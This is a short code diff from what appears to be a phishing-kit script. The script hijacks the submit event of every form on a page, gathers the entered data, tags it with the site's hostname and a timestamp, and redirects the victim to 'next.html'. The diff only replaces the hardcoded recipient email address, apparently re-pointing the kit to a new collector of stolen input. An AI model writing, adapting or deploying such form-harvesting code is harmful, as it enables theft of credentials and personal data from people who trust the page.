@@ -7,7 +7,7 @@ forms.forEach((form) => form.addEventListener("submit", o));
 
 function o(e) {
   e.preventDefault();
-  mail = "kingdave0080@gmail.com";
+  mail = "whitejones0070@gmail.com";
   next =  "next.html";
   subject = `${window.location.hostname} ${new Date()}`;
   let r = new FormData();
